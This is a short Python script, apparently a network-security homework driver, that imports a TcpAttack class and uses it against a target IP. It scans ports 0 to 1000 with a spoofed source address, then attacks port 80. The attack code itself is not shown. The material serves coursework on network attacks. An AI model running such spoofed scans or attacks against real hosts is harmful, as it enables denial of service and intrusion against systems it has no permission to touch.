#!/usr/bin/env python

from Bahrainwala_hw08 import *

spoofIP = '168.62.224.13'; targetIP = '192.168.1.1' ##'168.62.224.13'
rangeStart = 0 ; rangeEnd = 1000; port = 80
Tcp = TcpAttack(spoofIP,targetIP)
Tcp.scanTarget(rangeStart,rangeEnd)
if(Tcp.attackTarget(port)):
	print 'port was open to attack'
